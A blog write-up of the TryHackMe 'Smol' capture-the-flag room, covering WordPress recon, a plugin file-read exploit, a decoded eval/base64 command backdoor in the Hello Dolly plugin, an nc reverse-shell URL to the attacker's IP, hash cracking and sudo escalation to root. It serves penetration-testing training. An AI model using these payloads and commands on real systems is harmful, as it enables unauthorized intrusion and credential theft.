---
title: "TryHackMe: Smol"
author: cilgin
date: 2025-07-04 14:32:52 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-07-04-TryHackMe-Smol/main.webp
---

Hey everyone! Today, I'm diving into the [Smol](https://tryhackme.com/room/smol) room on TryHackMe. As the name suggests, it's a small box, but it's packed with fun challenges. Let's fire up our terminals and see what we can find.

First things first, let's set our target IP as an environment variable to make our lives easier.

```bash
export IP=10.10.108.1
```

---

## 🕵️‍♂️ Phase 1: Reconnaissance

Time for our trusty sidekick, `nmap`, to do its thing. We'll run a full port scan with script and version detection to get a good look at the target.

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-04 14:33 +0300
Nmap scan report for 10.10.108.1
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://www.smol.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.22 seconds
```

Our scan reveals two open ports: SSH (22) and HTTP (80). The HTTP title gives us a crucial clue: `Did not follow redirect to http://www.smol.thm`. This means we need to update our `/etc/hosts` file to resolve this domain name to the machine's IP address.

Let's point our browser to `http://www.smol.thm` and see what we get.

![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo1.webp){: width="1472" height="882" }

A wild WordPress site appears! Before we start poking around the admin panel, let's do some directory fuzzing with `gobuster` to map out the site's structure.

```bash
❯ gobuster dir -w common.txt -u http://www.smol.thm/ -x md,js,html,php,py,css,txt,bak -t 30
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.smol.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              py,css,txt,bak,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 301) [Size: 0] [--> http://www.smol.thm/]
/license.txt          (Status: 200) [Size: 19915]
/readme.html          (Status: 200) [Size: 7409]
/server-status        (Status: 403) [Size: 277]
/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
/wp-blog-header.php   (Status: 200) [Size: 0]
/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
/wp-config.php        (Status: 200) [Size: 0]
/wp-cron.php          (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
/wp-load.php          (Status: 200) [Size: 0]
/wp-login.php         (Status: 200) [Size: 4537]
/wp-links-opml.php    (Status: 200) [Size: 225]
/wp-mail.php          (Status: 403) [Size: 2497]
/wp-settings.php      (Status: 500) [Size: 0]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://www.smol.thm/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

The `gobuster` results confirm a standard WordPress layout. To get more juicy details, let's unleash the king of WordPress security scanning: `wpscan`.

```bash
❯ docker run --mount type=bind,source=/etc/hosts,target=/etc/hosts,readonly -it --rm wpscanteam/wpscan --url http://www.smol.thm/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://www.smol.thm/ [10.10.108.1]
[+] Started: Fri Jul  4 11:59:29 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=========================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul  4 11:59:38 2025
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 42.863 KB
[+] Data Received: 248.73 KB
[+] Memory used: 252.168 MB
[+] Elapsed time: 00:00:08
```

Jackpot! `wpscan` found an interesting plugin: `jsmol2wp`, last updated in 2018. An old plugin is like a "kick me" sign for hackers. A quick search reveals it's vulnerable to a classic **Server-Side Request Forgery (SSRF)**.

🔗 **Vulnerability Link:** <https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/>

SSRF lets us trick the server into making requests on our behalf. We can use this to read local files. Let's aim for the holy grail of WordPress configuration: `wp-config.php`.

```bash
❯ curl 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php'
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', '********************' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Success! We've got the database username (`wpuser`) and password. With these credentials, we can now log into the WordPress admin dashboard at `/wp-admin`.

![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo2.webp){: width="1071" height="888" }

We're in!

---

## 🐚 Phase 2: Initial Foothold

My first thought was to get a reverse shell by editing a theme or plugin file, but the permissions were locked down tight. Time to enumerate more from within the admin panel. A post titled "private webmaster tasks" catches my eye.

![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo3.webp){: width="929" height="953" }

The post mentions that the `Hello Dolly` plugin might have a backdoor. That's... suspicious. Let's use our SSRF vulnerability again to read the source code of `hello.php`.

```bash
❯ curl 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php'

<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, take her wrap, fellas
Dolly, never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, golly, gee, fellas
Have a little faith in me, fellas
Dolly, never go away
Promise, you'll never go away
Dolly'll never go away again";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}

add_action( 'admin_head', 'dolly_css' );
```

Aha! Tucked inside the `hello_dolly()` function is this highly suspicious line. Using `eval()` on a base64 encoded string is the digital equivalent of wearing a trench coat indoors. Let's decode it.

```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

```bash
❯ echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } %
```

The decoded string is still obfuscated with octal and hex codes. Let's decode those variable names.

```bash
❯ php -r 'echo "\143\155\x64" . ":" . "\143\x6d\144";'
cmd:cmd
```

As suspected, it's a simple command execution backdoor! It checks for a GET parameter named `cmd` and executes its value using `system()`. How convenient!

The `hello_dolly` function is hooked to `admin_notices`, which means it runs on any page in the admin dashboard.

![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo4.webp){: width="562" height="109" }

This is our entry point! We can simply browse to an admin page (like `/wp-admin/index.php`) and append our `cmd` parameter with a reverse shell payload.

First, let's grab a BASH reverse shell payload from [RevShells](https://www.revshells.com/). Then, we'll URL-encode it and add it to the URL.

**Important:** Using `curl` from the command line won't work because we need an authenticated session. The easiest way is to paste the final URL directly into your browser while you're logged into the WordPress admin panel.

```bash
# Set up a listener on your machine
nc -lvnp 4444

# Paste this URL into your browser (after logging in)
# Make sure to replace the IP and Port with your own!
curl 'http://www.smol.thm/wp-admin/index.php/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
```

And we should get a shell! Let's upgrade it to a fully interactive TTY.

```bash
# Upgrade the shell for a better experience
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Press CTRL+Z to background the shell
stty raw -echo;fg
reset
```

We are now logged in as `www-data`. Time to escalate our privileges.

---

## 🚀 Phase 3: Privilege Escalation

Let's start by looking around the system as the `www-data` user.

```bash
www-data@smol:/home$ ls -la
total 24
drwxr-xr-x  6 root  root     4096 Aug 16  2023 .
drwxr-xr-x 18 root  root     4096 Mar 29  2024 ..
drwxr-x---  2 diego internal 4096 Aug 18  2023 diego
drwxr-x---  2 gege  internal 4096 Aug 18  2023 gege
drwxr-x---  5 think internal 4096 Jan 12  2024 think
drwxr-x---  2 xavi  internal 4096 Aug 18  2023 xavi
```

We see a few user directories, but we can't access them because we're not in the `internal` group. Let's check the groups on the system.

```bash
www-data@smol:/home$ cat /etc/group
...
dev:x:1004:think,gege
internal:x:1005:diego,gege,think,xavi
...
```

The `internal` and `dev` groups look interesting. I ran `linpeas.sh` and it pointed out a potential Polkit vulnerability (CVE-2021-3560), but the exploit script didn't work. Time for another approach.

Since we have the password for the `wpuser` database account, let's connect to the MySQL database and see what we can find.

```bash
www-data@smol:/tmp$ mysql -u wpuser -p'******************' -D wordpress
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 419
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

The `wp_users` table is always a goldmine.

```sql
mysql> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
+------------+------------------------------------+
6 rows in set (0.00 sec)

```

We've got password hashes for all the users! These are phpass (WordPress MD5) hashes, which `hashcat` can handle with mode `400`. Let's save them to a file and crack them with `rockyou.txt`.

```text
# hashes.txt
admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```

```bash
❯ hashcat -m 400 -a 0 hashes.txt rockyou.txt
...
$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:***************
...
```

`hashcat` makes short work of it and cracks `diego`'s password in seconds. Let's switch users.

```bash
www-data@smol:/tmp$ su diego
Password: <cracked_password>
diego@smol:/tmp$ cd ~
diego@smol:~$ ls
user.txt
diego@smol:~$ cat user.txt
*********************************
```

User flag captured! Now let's continue our journey to root.

### Hopping from Diego to Think

Let's check out the other user directories. In `/home/think/.ssh`, we find a private key. It seems `think` was a bit careless with file permissions, and we can read it!

```bash
diego@smol:/home/think/.ssh$ ls -al
total 20
drwxr-xr-x 2 think think    4096 Jun 21  2023 .
drwxr-x--- 5 think internal 4096 Jan 12  2024 ..
-rwxr-xr-x 1 think think     572 Jun 21  2023 authorized_keys
-rwxr-xr-x 1 think think    2602 Jun 21  2023 id_rsa
-rwxr-xr-x 1 think think     572 Jun 21  2023 id_rsa.pub
```

Let's copy the `id_rsa` key to our machine, set the correct permissions, and SSH in as `think`.

```bash
❯ chmod 400 think.ssh
❯ ssh think@$IP -i think.ssh
think@smol:~$
```

We're in as `think`. On to the next hop!

### Hopping from Think to Gege

This is where things get a little strange. I tried to `su` to `gege` on a whim, and...

```bash
think@smol:~$ su gege
gege@smol:/home/think$
```

It worked! No password needed. There must be a strange authorization rule at play. I'm not complaining, though!

### Hopping from Gege to Xavi

In `gege`'s home directory, there's a tantalizing `wordpress.old.zip`. A backup! But of course, it's password-protected. Nothing a little `zip2john` and `john` can't handle. Let's get the file to our local machine to crack it.

```bash
# On the target machine (as gege)
gege@smol:~$ python3 -m http.server 8080

# On our local machine
❯ wget http://$IP:8080/wordpress.old.zip
❯ zip2john wordpress.old.zip > zip.hash
❯ john --wordlist=rockyou.txt zip.hash
...
**********@hotmail.com (wordpress.old.zip)
...
```

With the password cracked, we can unzip the file and inspect the old `wp-config.php`.

```bash
gege@smol:~$ unzip wordpress.old.zip
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password: <cracked_password>
...
gege@smol:~/wordpress.old$ cat wp-config.php
...
/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', '*************' );
...
```

And what do we find? Credentials for the user `xavi`!

### Hopping from Xavi to Root

Let's switch to our new user, `xavi`, and see what privileges we have. A quick `sudo -l` reveals the ultimate prize.

```bash
gege@smol:~/wordpress.old$ su xavi
Password: <xavi's_password_from_config>
xavi@smol:/home/gege/wordpress.old$ sudo -l
[sudo] password for xavi:
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```

We have `(ALL : ALL) ALL`! We've hit the jackpot.

```bash
xavi@smol:/home/gege/wordpress.old$ sudo su
root@smol:/home/gege/wordpress.old$ cd /root
root@smol:~# cat root.txt
****************************
```

And we are root! Room pwned. Thanks for reading!
